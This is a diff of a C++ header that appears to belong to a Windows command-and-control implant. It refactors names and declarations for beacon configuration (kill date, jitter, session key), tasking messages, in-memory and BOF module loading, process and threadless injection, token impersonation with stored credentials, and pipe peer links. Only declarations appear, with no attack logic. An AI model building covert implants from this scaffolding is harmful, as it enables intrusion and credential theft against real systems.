@@ -30,60 +30,36 @@ typedef uint64_t uint64;
 #define WIN_VERSION_2016_X      		11
 
 
-#define ntstatus                        ctx->teb->LastErrorValue
-#define GLOBAL_OFFSET                   (U_PTR(InstStart()) + U_PTR( &__global ))
-#define HEXANE                          _hexane *ctx = (_hexane*) C_DREF(GLOBAL_OFFSET)
-
-#define B_PTR(x)                        ((PBYTE) x)
-#define C_PTR(x)                        ((LPVOID) x)
-#define U_PTR(x)                        ((UINT_PTR) x)
-#define S_PTR(x)                        ((CONST CHAR*) x)
-
-#define C_DREF(x)                       (*(VOID**) x)
-#define R_CAST(T, x)                    (reinterpret_cast<T*>(x))
-#define RVA(T, b, r)                    (T) (U_PTR(b) + U_PTR(r))
-#define P_TYPE(T, x)                    ((T*) x)
-
+#define ntstatus                        Ctx->Teb->LastErrorValue
+#define RVA(T, b, r)                    (T) ((UINT_PTR)(b) + (UINT_PTR)(r))
 
 #define DTYPE(x)						decltype(x) *x
-#define FUNCTION						TEXT_SECTION(B)
-#define CONFIG                          TEXT_SECTION(F)
-#define SECTION(x)                      __attribute__((used, section(x)))
-#define TEXT_SECTION(x)                 __attribute__((used, section(".text$" #x "")))
+#define DATA_SECTION(x)                 __attribute__((used, section(".data")))
+#define TEXT_SECTION(x)                 __attribute__((used, section(".text")))
 #define DLL_EXPORT                      __declspec(dllexport)
 
 #define PS_ATTR_LIST_SIZE(n)            (sizeof(PS_ATTRIBUTE_LIST) + (sizeof(PS_ATTRIBUTE) * (n - 1)))
-#define MODULE_NAME(mod)				    (mod->BaseDllName.Buffer)
+#define MODULE_NAME(mod)				(mod->BaseDllName.Buffer)
 
 #define PEB_POINTER64                   ((PPEB) __readgsqword(0x60))
 #define PEB_POINTER32                   ((PPEB) __readfsdword(0x30))
 #define REG_PEB32(thr)                  ((LPVOID) (ULONG_PTR) thr.Ebx + 0x8)
 #define REG_PEB64(thr)                  ((LPVOID) (ULONG_PTR) thr.Rdx + 0x10)
 
-#define ITER_SECTION_HEADER(data, i)	((PIMAGE_SECTION_HEADER) B_PTR(data) + sizeof(IMAGE_FILE_HEADER) + (sizeof(IMAGE_SECTION_HEADER) * i))
-#define SYMBOL_TABLE(data, nt_head) 	RVA(_coff_symbol*, data, nt_head->FileHeader.PointerToSymbolTable)
-#define RELOC_SECTION(data, section)	RVA(_reloc*, data, section->PointerToRelocations)
-#define SEC_START(map, index)           U_PTR(B_PTR(map[index].address))
-#define SEC_END(map, index)             U_PTR(B_PTR(map[index].address) + map[index].size)
+#define ITER_SECTION_HEADER(data, i)	((PIMAGE_SECTION_HEADER) (PBYTE)(data) + sizeof(IMAGE_FILE_HEADER) + (sizeof(IMAGE_SECTION_HEADER) * i))
+#define SYMBOL_TABLE(data, nt_head) 	RVA(COFF_SYMBOL*, data, nt_head->FileHeader.PointerToSymbolTable)
+#define RELOC_SECTION(data, section)	RVA(RELOC*, data, section->PointerToRelocations)
+#define SEC_START(map, index)           U_PTR((PBYTE)(map[index].address))
+#define SEC_END(map, index)             U_PTR((PBYTE)(map[index].address) + map[index].size)
 
 #define NtCurrentProcess()              ((HANDLE) (LONG_PTR) -1)
 #define NtCurrentThread()               ((HANDLE) (LONG_PTR) -2)
 #define PIPE_BUFFER_MAX                 (64 * 1000 - 1)
 #define NT_SUCCESS(x)                   (x >= 0)
 
-#define NONCE_SIZE                      ((uint32_t) 16)
-#define DH_KEY_SIZE                     ((uint32_t) 2048)
-#define AES_KEY_SIZE					((uint32_t) 16)
-
-#define Malloc(s)                       ctx->win32.RtlAllocateHeap(ctx->heap, HEAP_ZERO_MEMORY, s)
-#define Realloc(p, s)                   ctx->win32.RtlReAllocateHeap(ctx->heap, HEAP_ZERO_MEMORY, p, s)
-#define Free(s) 			    	    ctx->win32.RtlFreeHeap(ctx->heap, 0, s)
-
-#define x_assert(x)                     if (!(x)) goto defer
-#define x_assertb(x)                    if (!(x)) { success = false; goto defer; }
-#define x_ntassert(x)                   ntstatus = x; if (!NT_SUCCESS(ntstatus)) goto defer
-#define x_ntassertb(x)                  ntstatus = x; if (!NT_SUCCESS(ntstatus)) { success = false; goto defer; }
-#define return_defer(x)                 ntstatus = x; goto defer
+#define NONCE_SIZE                      ((UINT32) 16)
+#define DH_KEY_SIZE                     ((UINT32) 2048)
+#define AES_KEY_SIZE					((UINT32) 16)
 
 #define INIT_LIST_ENTRY(entry)          ((entry)->Blink = (entry)->Flink = (entry))
 #define F_PTR_HMOD(F, M, SH)            (F = (decltype(F)) Modules::FindExportAddress(M, SH))
@@ -92,25 +68,25 @@ typedef uint64_t uint64;
 #define M_PTR(MH)                       ((Modules::FindModuleEntry(MH))->DllBase)
 
 #if	defined(__GNUC__) || defined(__GNUG__)
-#define __builtin_bswap32 __bswapd
-#define __builtin_bswap64 __bswapq
+#define __bswap32 __bswapd
+#define __bswap64 __bswapq
 #endif
 
 #define RANDOM(n)               (Utils::Random::RandomNumber32() % (n))
-#define PAGE_ALIGN(x)           (B_PTR(U_PTR(x) + ((4096 - (U_PTR(x) & (4096 - 1))) % 4096)))
+#define PAGE_ALIGN(x)           ((PBYTE)(U_PTR(x) + ((4096 - (U_PTR(x) & (4096 - 1))) % 4096)))
 #define ARRAY_LEN(p)            sizeof(p) / sizeof(p[0])
 #define DYN_ARRAY_LEN(i, p)     while (p[i]) { i++; }
 #define IN_RANGE(b, e, x)       (x >= b && x < e)
 
 #define FILL_MBS(s, b)							\
-	s.length = (USHORT) MbsLength(b);			\
-	s.max_length = s.length;					\
-	s.buffer = b
+	s.Length = (USHORT) MbsLength(b);			\
+	s.Capacity = s.Length;						\
+	s.Buffer = b
 
 #define FILL_WCS(s, b)							\
-	s.length = (USHORT) WcsLength(b);			\
-	s.max_length = s.length;					\
-	s.buffer = b
+	s.Length = (USHORT) WcsLength(b);			\
+	s.Capacity = s.Length;						\
+	s.Buffer = b
 
 #define InitializeObjectAttributes(ptr, name, attr, root, sec)	\
 	(ptr)->Length = sizeof( OBJECT_ATTRIBUTES);					\
@@ -163,10 +139,8 @@ typedef uint64_t uint64;
 
 #define EGRESS                                      0
 #define INGRESS                                     1
-#define HEAP_NO_COMMIT                              0, 0, 0, 0, 0
-#define DESKTOP_ENVIRONMENT_NULL                    0, 0, 0, 0, 0, 0, 0
-#define SMB_SID_SINGLE_WORLD_SUBAUTHORITY           SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0
-#define SMB_RID_SINGLE_MANDATORY_LOW                SECURITY_MANDATORY_LOW_RID, 0, 0, 0, 0, 0, 0, 0
+#define HEAP_NO_COMMIT                              0,0,0,0,0
+#define DESKTOP_ENVIRONMENT_NULL                    0,0,0,0,0,0,0
 #define PROCESS_CREATE_ALL_ACCESS_SUSPEND           PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, nullptr, nullptr, NULL, THREAD_CREATE_FLAGS_CREATE_SUSPENDED
 #define IMAGE_SCN_MEM_RWX                           (IMAGE_SCN_MEM_EXECUTE |IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE)
 #define IMAGE_SCN_MEM_RW                            (IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE)
@@ -186,8 +160,8 @@ typedef uint64_t uint64;
 #define IOCTL1                                      0x80862007
 
 #pragma region TLV
-#define HEADER_SIZE                                 (sizeof(uint32_t) * 3)
-#define SEGMENT_HEADER_SIZE                         ((sizeof(uint32_t) * 6) + sizeof(uint32_t))
+#define HEADER_SIZE                                 (sizeof(UINT32) * 3)
+#define SEGMENT_HEADER_SIZE                         ((sizeof(UINT32) * 6) + sizeof(UINT32))
 #define HTTP_REQUEST_MAX                            0x300000
 #pragma endregion
 
@@ -272,85 +246,64 @@ typedef NTSTATUS (NTAPI* NtAlertResumeThread_t)(HANDLE ThreadHandle, PULONG Prev
 typedef NTSTATUS (NTAPI* NtSignalAndWaitForSingleObject_t)(HANDLE SignalHandle, HANDLE WaitHandle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);
 
 enum ModuleType {
-    LoadLocalFile,
-    LoadRemoteFile,
-    LoadMemory,
-    LoadBof,
-    NoLink,
+    LocalFile, RemoteFile, Memory, LoadBof, NoLink,
 };
 
 enum MessageType {
-    TypeCheckin,
-    TypeTasking,
-    TypeResponse,
-    TypeSegment,
-    TypeExecute,
-    TypeObject,
-    TypeError,
+    CheckIn, Tasking, Response, Segment, Execute, Object, Error,
 };
 
 enum DX_MEMORY {
-	DX_MEM_DEFAULT,
-	DX_MEM_WIN32,
-	DX_MEM_SYSCALL,
+	Default, Win32, Syscall,
 };
 
-
 typedef struct _hash_map {
-	DWORD   name;
-	LPVOID  address;
-}HASH_MAP, *PHASH_MAP;
-
+	DWORD   Name;
+	LPVOID  Address;
+} HASH_MAP, *PHASH_MAP;
 
 typedef struct _object_map {
-	PBYTE   address;
-	SIZE_T  size;
-}OBJECT_MAP, *POBJECT_MAP;
-
+	PBYTE   Address;
+	SIZE_T  Size;
+} OBJECT_MAP, *POBJECT_MAP;
 
 typedef struct _buffer {
     LPVOID Buffer;
     UINT32 Length;
 } BUFFER, *PBUFFER;
 
-
 typedef struct _mbs_buffer {
-	LPSTR    buffer;
-	ULONG    length;
-	ULONG    max_length;
-}MBS_BUFFER, *PMBS_BUFFER;
-
+	LPSTR    Buffer;
+	ULONG    Length;
+	ULONG    Capacity;
+} MBS_BUFFER, *PMBS_BUFFER;
 
 typedef struct _wcs_buffer {
-	LPWSTR   buffer;
-	ULONG    length;
-	ULONG    max_length;
-}WCS_BUFFER, *PWCS_BUFFER;
-
+	LPWSTR   Buffer;
+	ULONG    Length;
+	ULONG    Capacity;
+} WCS_BUFFER, *PWCS_BUFFER;
 
 typedef struct _resource {
-    LPVOID   rsrc_lock;
-    HGLOBAL  h_global;
-    SIZE_T   size;
-}RESOURCE, *PRESOURCE;
-
+    LPVOID   Lock;
+    HGLOBAL  Global;
+    SIZE_T   Size;
+} RESOURCE, *PRESOURCE;
 
 typedef struct _threadless {
-    PCHAR       target_process;
-    PCHAR       target_module;
-    PCHAR       target_export;
-    POBJECT_MAP loader;
-    POBJECT_MAP opcode;
-}THREADLESS, *PTHREADLESS;
-
+    PCHAR       TargetProc;
+    PCHAR       TargetMod;
+    PCHAR       TargetExp;
+    POBJECT_MAP Loader;
+    POBJECT_MAP Opcode;
+} THREADLESS, *PTHREADLESS;
 
 typedef struct _veh_writer {
-    LPVOID   target;
-    PWCHAR   mod_name;
-    PCHAR    signature;
-    PCHAR    mask;
-}VEH_WRITER, *PVEH_WRITER;
-
+    LPVOID   Target;
+    PWCHAR   ModName;
+    PCHAR    Signature;
+    PCHAR    Mask;
+} VEH_WRITER, *PVEH_WRITER;
 
 typedef struct _coff_symbol {
 	union {
@@ -363,36 +316,33 @@ typedef struct _coff_symbol {
 	UINT16 Type;
 	UINT8  StorageClass;
 	UINT8  NumberOfAuxSymbols;
-}COFF_SYMBOL, *PCOFF_SYMBOL;
-
+} COFF_SYMBOL, *PCOFF_SYMBOL;
 
 typedef struct _coff_params {
-	PCHAR    entrypoint;
-	DWORD    entrypoint_length;
-	PVOID    data;
-	PVOID    args;
-	SIZE_T   data_size;
-	SIZE_T   args_size;
-	UINT32   task_id;
-	UINT32   bof_id;
-    BOOL     b_cache;
-	_coff_params *next;
+	PCHAR    	Entrypoint;
+	DWORD    	nEntrypoint;
+	PVOID    	Data;
+	PVOID    	Args;
+	SIZE_T   	nData;
+	SIZE_T   	nArgs;
+	UINT32   	TaskId;
+	UINT32   	BofId;
+    BOOL     	bCache;
+	_coff_params *Next;
 }COFF_PARAMS, *PCOFF_PARAMS;
 
-
 typedef struct _inject_context {
-	HANDLE  process;
-	DWORD   tid;
-	DWORD   pid;
-	HANDLE  thread;
-	SHORT   arch;
-	BOOL    b_stdout;
-	BOOL    suspend_awake;
-	LPVOID  parameter;
-	UINT32  parameter_size;
-	SHORT   technique;
+	HANDLE  Process;
+	DWORD   Tid;
+	DWORD   Pid;
+	HANDLE  Thread;
+	SHORT   Arch;
+	BOOL    bStdout;
+	BOOL    SuspendAwake;
+	LPVOID  Parameter;
+	UINT32  nParameter;
+	SHORT   Technique;
 } INJECT_CONTEXT, *PINJECT_CONTEXT;
-
 
 typedef struct _reloc {
 	UINT32  VirtualAddress;
@@ -400,341 +350,346 @@ typedef struct _reloc {
 	UINT16  Type;
 } RELOC, *PRELOC;
 
-
 typedef struct _executable {
-	BOOL                    link;
-	BOOL                    success;
-	PBYTE                   buffer;
-	PBYTE                   base;
-	LPVOID                  text;
-	SIZE_T                  size;
+	BOOL                    Link;
+	BOOL                    Success;
+	PBYTE                   Data;
+	LPVOID                  Text;
+	SIZE_T                  Size;
 
-	LPWSTR                  local_name;
-	LPWSTR                  cracked_name;
-	SIZE_T                  base_size;
-	SIZE_T                  buf_size;
-	UINT32                  task_id;
+	LPWSTR                  LocalName;
+	LPWSTR                  CrackedName;
+	SIZE_T                  DataSize;
+	UINT32                  TaskId;
 
-	PRELOC                  reloc;
-	IMAGE_NT_HEADERS        *nt_head;
-	IMAGE_SECTION_HEADER    *section;
-	IMAGE_EXPORT_DIRECTORY  *exports;
-	PCOFF_SYMBOL            symbols;
-	POBJECT_MAP             fn_map;
-	POBJECT_MAP             sec_map;
-	INT                     n_reloc;
-	INT                     n_mapping;
+	PRELOC                  Reloc;
+	IMAGE_NT_HEADERS        *NtHead;
+	IMAGE_SECTION_HEADER    *SxnHead;
+	IMAGE_EXPORT_DIRECTORY  *Exports;
+	PCOFF_SYMBOL            Symbols;
+	POBJECT_MAP             FnMap;
+	POBJECT_MAP             SecMap;
+	INT                     nReloc;
+	INT                     nMapping;
 
-	HANDLE                  heap;
-	HANDLE                  handle;
-	HANDLE                  thread;
-	PPS_ATTRIBUTE_LIST      attrs;
-	PRTL_USER_PROCESS_PARAMETERS params;
-	PS_CREATE_INFO          create;
+	HANDLE                  Heap;
+	HANDLE                  Handle;
+	HANDLE                  Thread;
+	PPS_ATTRIBUTE_LIST      Attrs;
+	PRTL_USER_PROCESS_PARAMETERS Params;
+	PS_CREATE_INFO          CreateInfo;
 
-	_executable *next;
+	_executable *Next;
 } EXECUTABLE, *PEXECUTABLE;
 
-
-typedef struct _request_context {
-    HINTERNET conn_handle;
-    HINTERNET req_handle;
-    LPWSTR    endpoint;
-}REQUEST_CONTEXT, *PREQUEST_CONTEXT;
-
-
-typedef struct _proxy_context {
-    WINHTTP_CURRENT_USER_IE_PROXY_CONFIG    proxy_config;
-    WINHTTP_AUTOPROXY_OPTIONS               autoproxy;
-    WINHTTP_PROXY_INFO                      proxy_info;
-}PROXY_CONTEXT, *PPROXY_CONTEXT;
-
+typedef struct _request {
+    HINTERNET ConnHandle;
+    HINTERNET ReqHandle;
+    LPWSTR    Endpoint;
+} REQUEST, *PREQUEST;
 
 typedef struct _proxy {
-	LPWSTR address;
-	LPWSTR username;
-	LPWSTR password;
-}PROXY, *PPROXY;
+    WINHTTP_CURRENT_USER_IE_PROXY_CONFIG    Config;
+    WINHTTP_AUTOPROXY_OPTIONS               Autoproxy;
+    WINHTTP_PROXY_INFO                      ProxyInfo;
 
+	LPWSTR Address;
+	LPWSTR Username;
+	LPWSTR Password;
+} PROXY, *PPROXY;
 
-typedef struct _http_context {
-	HINTERNET    handle;
-	LPWSTR       useragent;
-	LPWSTR       method;
-	LPWSTR       address;
-	INT          port;
-	LPCWSTR      accept;
-	ULONG        access;
-	ULONG        flags;
-	INT          n_endpoints;
-	LPWSTR       *endpoints;
-	LPWSTR       *headers;
-	PROXY        *proxy;
-}HTTP_CONTEXT, *PHTTP_CONTEXT;
+typedef struct _http {
+	HINTERNET    Handle;
+	LPWSTR       Useragent;
+	LPWSTR       Method;
+	LPWSTR       Address;
+	INT          Port;
+	LPCWSTR      Accept;
+	ULONG        Access;
+	ULONG        Flags;
+	INT          nEndpoints;
+	LPWSTR       *Endpoints;
+	LPWSTR       *Headers;
+	PROXY        *Proxy;
+} HTTP, *PHTTP;
 
+typedef struct _token {
+	HANDLE  Handle;
+	LPWSTR  DomainUser;
+	DWORD   Pid;
+	SHORT   Type;
 
-typedef struct _token_data {
-	HANDLE  handle;
-	LPWSTR  domain_user;
-	DWORD   pid;
-	SHORT   type;
+	LPWSTR   Username;
+	LPWSTR   Password;
+	LPWSTR   Domain;
 
-	LPWSTR   username;
-	LPWSTR   password;
-	LPWSTR   domain;
+	_token* Next;
+} TOKEN, *PTOKEN;
 
-	_token_data* next;
-}TOKEN_DATA, *PTOKEN_DATA;
-
-
-typedef struct _pipe_data {
-	DWORD    peer_id;
-	HANDLE   pipe_handle;
-	LPWSTR   pipe_name;
-	_pipe_data  *next;
-}PIPE_DATA, *PPIPE_DATA;
-
+typedef struct _pipe {
+	DWORD    PeerId;
+	HANDLE   PipeHandle;
+	LPWSTR   PipeName;
+	_pipe  *Next;
+} PIPE, *PPIPE;
 
 typedef void (*OBJ_ENTRY)(char* args, uint32_t size);
 
-
 struct LdrpVectorHandlerEntry {
-    LdrpVectorHandlerEntry *flink;
-    LdrpVectorHandlerEntry *blink;
-    uint64_t               unknown1;
-    uint64_t               unknown2;
-    PVECTORED_EXCEPTION_HANDLER handler;
+    LdrpVectorHandlerEntry *Flink;
+    LdrpVectorHandlerEntry *Blink;
+    uint64_t               Unknown1;
+    uint64_t               Unknown2;
+    PVECTORED_EXCEPTION_HANDLER Handler;
 };
-
 
 struct LdrpVectorHandlerList {
-    LdrpVectorHandlerEntry *first;
-    LdrpVectorHandlerEntry *last;
-    SRWLOCK 				lock;
+    LdrpVectorHandlerEntry *First;
+    LdrpVectorHandlerEntry *Last;
+    SRWLOCK 				Lock;
 };
-
 
 typedef struct _parser {
-    LPVOID  handle;
-    LPVOID  buffer;
-    ULONG   length;
+    LPVOID  Handle;
+    LPVOID  Buffer;
+    ULONG   Length;
 } PARSER, *PPARSER;
 
-
-typedef struct _stream {
-    BYTE    inbound;
-    ULONG   peer_id;
-    ULONG   task_id;
-    ULONG   type;
-    ULONG   length;
-    PBYTE   buffer;
-    BOOL    ready;
-
-    _stream  *next;
-} STREAM, *PSTREAM;
-
+typedef struct _packet {
+    BYTE    	TransportType;
+    ULONG   	PeerId;
+    ULONG   	TaskId;
+    ULONG   	MsgType;
+    ULONG   	MsgLength;
+    PBYTE   	MsgData;
+    BOOL    	Ready;
+	BOOL 		Remove;
+    _packet  	*Next;
+} PACKET, *PPACKET;
 
 struct _hexane {
-	PTEB          teb;
-	LPVOID        heap;
-	DWORD         n_threads;
-	PCOFF_PARAMS  bof_cache;
-	PPIPE_DATA    peers;
+	PTEB          	Teb;
+	LPVOID        	Heap;
+	DWORD         	nThreads;
+	PCOFF_PARAMS  	DataCache;
+	PPIPE    		PeerCache;
+	PPACKET 		MessageCache;
 
 	struct {
-		UINT_PTR address;
-		DWORD    size;
-	} base;
+		PBYTE   SessionKey;
+		UINT32  WorkingHours;
+		UINT64  Killdate;
+		LPSTR   Hostname;
+		ULONG   Sleeptime;
+		ULONG   Jitter;
+		ULONG   Hours;
+		DWORD 	PeerId
+	} Config;
 
 	struct {
-		HMODULE ntdll;
-		HMODULE kernel32;
-		HMODULE kernbase;
-		struct {
-			PEXECUTABLE shlwapi;
-			PEXECUTABLE crypt32;
-			PEXECUTABLE winhttp;
-			PEXECUTABLE advapi;
-			PEXECUTABLE iphlpapi;
-			PEXECUTABLE mscoree;
-		} dload;
-	} modules;
+		WORD   Arch;
+		ULONG  Ppid;
+		ULONG  Pid;
+		ULONG  Tid;
+		ULONG  Version;
+		ULONG  CurrentTaskId;
+		UINT32 Retries;
+		BOOL   CheckIn;
+	} Session;
 
 	struct {
-		PBYTE   session_key;
-		UINT32  working_hours;
-		UINT64  kill_date;
-		LPSTR   hostname;
-		ULONG   sleeptime;
-		ULONG   jitter;
-		ULONG   hours;
-	} config;
+		PHTTP 	Http;
+        LPWSTR  EgressName;
+        HANDLE  EgressHandle;
+		LPSTR   Domain;
+		LPVOID  EnvProxy;
+		SIZE_T  nEnvProxy;
+		BOOL    bSSL;
+		BOOL    bProxy;
+		BOOL    bEnvProxy;
+		BOOL    bCheck;
+	} Transport;
 
 	struct {
-		WORD   arch;
-		ULONG  ppid;
-		ULONG  pid;
-		ULONG  tid;
-		ULONG  version;
-		ULONG  current_taskid;
-        ULONG  peer_id;
-		UINT32 retries;
-		BOOL   checkin;
-	} session;
-
-	struct {
-		PHTTP_CONTEXT http;
-		PPIPE_DATA    pipe_data;
-        LPWSTR         egress_name;
-        HANDLE         egress_handle;
-		LPSTR          domain;
-		LPVOID         env_proxy;
-		SIZE_T         env_proxylen;
-		BOOL           b_ssl;
-		BOOL           b_proxy;
-		BOOL           b_envproxy;
-		BOOL           b_envproxy_check;
-	    PSTREAM        message_queue;
-	} transport;
-
-	// TODO: set standard apis for stagers and payloads
-
-    struct {
+		// Validation / Utility
 		DTYPE(IsBadReadPtr);
-		DTYPE(DeviceIoControl);
-        DTYPE(FileTimeToSystemTime);
-        DTYPE(GetCurrentDirectoryA);
-        DTYPE(SystemTimeToTzSpecificLocalTime);
-        DTYPE(GetSystemTimeAsFileTime);
-        DTYPE(GetLocalTime);
-        DTYPE(PathFindFileNameW);
-        DTYPE(GetFileAttributesW);
-        DTYPE(CreateFileW);
-        DTYPE(FindFirstFileA);
-        DTYPE(FindFirstFileW);
-        DTYPE(FindNextFileA);
-        DTYPE(FindNextFileW);
-        DTYPE(FindClose);
-        DTYPE(GetFileSize);
-        DTYPE(ReadFile);
-        DTYPE(WriteFile);
-        DTYPE(LookupAccountSidW);
-        DTYPE(LookupPrivilegeValueA);
-        DTYPE(AddMandatoryAce);
-        DTYPE(SetEntriesInAclA);
-        DTYPE(AllocateAndInitializeSid);
-        DTYPE(InitializeSecurityDescriptor);
-        DTYPE(SetSecurityDescriptorDacl);
-        DTYPE(SetSecurityDescriptorSacl);
-        DTYPE(InitializeAcl);
-        DTYPE(FreeSid);
-        DTYPE(WinHttpOpen);
-        DTYPE(WinHttpConnect);
-        DTYPE(WinHttpOpenRequest);
-        DTYPE(WinHttpAddRequestHeaders);
-        DTYPE(WinHttpSetOption);
-        DTYPE(WinHttpGetProxyForUrl);
-        DTYPE(WinHttpGetIEProxyConfigForCurrentUser);
-        DTYPE(WinHttpSendRequest);
-        DTYPE(WinHttpReceiveResponse);
-        DTYPE(WinHttpReadData);
-        DTYPE(WinHttpQueryHeaders);
-        DTYPE(WinHttpQueryDataAvailable);
-        DTYPE(WinHttpCloseHandle);
-        DTYPE(CallNamedPipeW);
-        DTYPE(CreateNamedPipeW);
-        DTYPE(WaitNamedPipeW);
-        DTYPE(SetNamedPipeHandleState);
-        DTYPE(ConnectNamedPipe);
-        DTYPE(TransactNamedPipe);
-        DTYPE(DisconnectNamedPipe);
-        DTYPE(PeekNamedPipe);
-        NtOpenProcess_t NtOpenProcess;
-        NtCreateUserProcess_t NtCreateUserProcess;
-        NtTerminateProcess_t NtTerminateProcess;
-        RtlCreateProcessParametersEx_t RtlCreateProcessParametersEx;
-        RtlDestroyProcessParameters_t RtlDestroyProcessParameters;
-        NtOpenProcessToken_t NtOpenProcessToken;
-        NtOpenThreadToken_t NtOpenThreadToken;
-        NtDuplicateToken_t NtDuplicateToken;
-        NtDuplicateObject_t NtDuplicateObject;
-        NtQueryInformationToken_t NtQueryInformationToken;
-        NtQueryInformationProcess_t NtQueryInformationProcess;
-        DTYPE(GetProcessId);
-        DTYPE(ImpersonateLoggedOnUser);
-        DTYPE(AdjustTokenPrivileges);
-        NtFreeVirtualMemory_t NtFreeVirtualMemory;
-        NtAllocateVirtualMemory_t NtAllocateVirtualMemory;
-        NtProtectVirtualMemory_t NtProtectVirtualMemory;
-        NtReadVirtualMemory_t NtReadVirtualMemory;
-        NtWriteVirtualMemory_t NtWriteVirtualMemory;
-        NtQueryVirtualMemory_t NtQueryVirtualMemory;
-        NtCreateSection_t NtCreateSection;
-        NtMapViewOfSection_t NtMapViewOfSection;
-        NtUnmapViewOfSection_t NtUnmapViewOfSection;
-        RtlAddVectoredExceptionHandler_t RtlAddVectoredExceptionHandler;
-        RtlRemoveVectoredExceptionHandler_t RtlRemoveVectoredExceptionHandler;
-        SetProcessValidCallTargets_t SetProcessValidCallTargets;
-        RtlCreateHeap_t RtlCreateHeap;
-        RtlAllocateHeap_t RtlAllocateHeap;
-        RtlReAllocateHeap_t RtlReAllocateHeap;
-        RtlFreeHeap_t RtlFreeHeap;
-        RtlDestroyHeap_t RtlDestroyHeap;
-        RtlRbInsertNodeEx_t RtlRbInsertNodeEx;
-        DTYPE(GetProcAddress);
-        DTYPE(GetModuleHandleA);
-        DTYPE(LoadLibraryA);
-        DTYPE(FreeLibrary);
-        DTYPE(RegOpenKeyExA);
-        DTYPE(RegCreateKeyExA);
-        DTYPE(RegSetValueExA);
-        DTYPE(RegCloseKey);
-        DTYPE(IsWow64Process);
-        DTYPE(GetUserNameA);
-        DTYPE(CreateToolhelp32Snapshot);
-        DTYPE(Process32First);
-        DTYPE(Process32Next);
-        DTYPE(Module32First);
-        DTYPE(Module32Next);
-        DTYPE(GetAdaptersInfo);
-        DTYPE(GetCurrentProcessId);
-        DTYPE(GlobalMemoryStatusEx);
-        DTYPE(GetComputerNameExA);
-        RtlGetVersion_t RtlGetVersion;
-        NtQuerySystemInformation_t NtQuerySystemInformation;
-        NtQuerySystemTime_t NtQuerySystemTime;
-        CLRCreateInstance_t CLRCreateInstance;
-        NtCreateThreadEx_t NtCreateThreadEx;
-        NtOpenThread_t NtOpenThread;
-        NtTerminateThread_t NtTerminateThread;
-        NtResumeThread_t NtResumeThread;
-        NtGetContextThread_t NtGetContextThread;
-        NtSetContextThread_t NtSetContextThread;
-        NtSetInformationThread_t NtSetInformationThread;
-        TpAllocWork_t TpAllocWork;
-        TpPostWork_t TpPostWork;
-        TpReleaseWork_t TpReleaseWork;
-        NtTestAlert_t NtTestAlert;
-        NtDelayExecution_t NtDelayExecution;
-        NtCreateEvent_t NtCreateEvent;
-        NtQueueApcThread_t NtQueueApcThread;
-        NtAlertResumeThread_t NtAlertResumeThread;
-        NtWaitForSingleObject_t NtWaitForSingleObject;
-        NtSignalAndWaitForSingleObject_t NtSignalAndWaitForSingleObject;
-        NtContinue_t NtContinue;
-        DTYPE(SleepEx);
-        DTYPE(CryptStringToBinaryA);
-        DTYPE(CryptBinaryToStringA);
-        DTYPE(FindResourceA);
-        DTYPE(LoadResource);
-        DTYPE(LockResource);
-        DTYPE(SizeofResource);
-        DTYPE(FreeResource);
-        DTYPE(FlushInstructionCache);
-        RtlInitUnicodeString_t RtlInitUnicodeString;
-        RtlHashUnicodeString_t RtlHashUnicodeString;
-        RtlRandomEx_t RtlRandomEx;
-        NtClose_t NtClose;
-    } win32;
+
+		// File I/O
+		DTYPE(CreateFileW);
+		DTYPE(GetFileAttributesW);
+		DTYPE(FindFirstFileA);
+		DTYPE(FindFirstFileW);
+		DTYPE(FindNextFileA);
+		DTYPE(FindNextFileW);
+		DTYPE(FindClose);
+		DTYPE(GetFileSize);
+		DTYPE(ReadFile);
+		DTYPE(WriteFile);
+
+		// Time and Date
+		DTYPE(FileTimeToSystemTime);
+		DTYPE(SystemTimeToTzSpecificLocalTime);
+		DTYPE(GetSystemTimeAsFileTime);
+		DTYPE(GetLocalTime);
+		DTYPE(GetCurrentDirectoryA);
+
+		// Path Operations
+		DTYPE(PathFindFileNameW);
+
+		// Named Pipes
+		DTYPE(CallNamedPipeW);
+		DTYPE(CreateNamedPipeW);
+		DTYPE(WaitNamedPipeW);
+		DTYPE(SetNamedPipeHandleState);
+		DTYPE(ConnectNamedPipe);
+		DTYPE(TransactNamedPipe);
+		DTYPE(DisconnectNamedPipe);
+		DTYPE(PeekNamedPipe);
+
+		// HTTP / Networking
+		DTYPE(WinHttpOpen);
+		DTYPE(WinHttpConnect);
+		DTYPE(WinHttpOpenRequest);
+		DTYPE(WinHttpAddRequestHeaders);
+		DTYPE(WinHttpSetOption);
+		DTYPE(WinHttpGetProxyForUrl);
+		DTYPE(WinHttpGetIEProxyConfigForCurrentUser);
+		DTYPE(WinHttpSendRequest);
+		DTYPE(WinHttpReceiveResponse);
+		DTYPE(WinHttpReadData);
+		DTYPE(WinHttpQueryHeaders);
+		DTYPE(WinHttpQueryDataAvailable);
+		DTYPE(WinHttpCloseHandle);
+		DTYPE(GetAdaptersInfo);
+
+		// Security / ACL / Tokens
+		DTYPE(LookupAccountSidW);
+		DTYPE(LookupPrivilegeValueA);
+		DTYPE(ImpersonateLoggedOnUser);
+		DTYPE(AdjustTokenPrivileges);
+		DTYPE(AddMandatoryAce);
+		DTYPE(SetEntriesInAclA);
+		DTYPE(AllocateAndInitializeSid);
+		DTYPE(InitializeSecurityDescriptor);
+		DTYPE(SetSecurityDescriptorDacl);
+		DTYPE(SetSecurityDescriptorSacl);
+		DTYPE(InitializeAcl);
+		DTYPE(FreeSid);
+		NtOpenProcessToken_t NtOpenProcessToken;
+		NtOpenThreadToken_t NtOpenThreadToken;
+		NtDuplicateToken_t NtDuplicateToken;
+		NtQueryInformationToken_t NtQueryInformationToken;
+
+		// Process Management
+		NtOpenProcess_t NtOpenProcess;
+		NtCreateUserProcess_t NtCreateUserProcess;
+		NtTerminateProcess_t NtTerminateProcess;
+		RtlCreateProcessParametersEx_t RtlCreateProcessParametersEx;
+		RtlDestroyProcessParameters_t RtlDestroyProcessParameters;
+		NtDuplicateObject_t NtDuplicateObject;
+		NtQueryInformationProcess_t NtQueryInformationProcess;
+		DTYPE(GetProcessId);
+		DTYPE(GetCurrentProcessId);
+		DTYPE(IsWow64Process);
+
+		// Threading / APCs
+		NtCreateThreadEx_t NtCreateThreadEx;
+		NtOpenThread_t NtOpenThread;
+		NtTerminateThread_t NtTerminateThread;
+		NtResumeThread_t NtResumeThread;
